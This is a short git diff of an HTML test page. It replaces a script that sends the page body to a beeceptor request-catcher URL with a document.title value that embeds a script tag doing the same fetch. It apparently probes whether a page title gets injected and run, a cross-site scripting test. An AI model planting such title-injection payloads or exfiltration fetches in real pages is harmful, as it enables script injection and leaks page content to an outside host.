@@ -8,11 +8,12 @@
   <body id="headercheck">
     Hey New Name
     <script type="text/javascript">
-      document.title = document.getElementsByTagName("body")[0].innerHTML;
-      console.log(document.title);
-      fetch("https://catchtag.free.beeceptor.com/" + document.title)
-        .then((response) => response.json())
-        .then((data) => console.log(data));
+      // document.title = document.getElementsByTagName("body")[0].innerHTML;
+      // console.log(document.title);
+      document.title = "<script> fetch('https://catchtag.free.beeceptor.com/' + document.getElementsByTagName('body')[0].innerHTML).then((response) => response.json()).then((data) => console.log(data));</script>"
+      // <!-- fetch("https://catchtag.free.beeceptor.com/" + document.title)
+      //   .then((response) => response.json())
+      //   .then((data) => console.log(data)); -->
     </script>
   </body>
 </html>
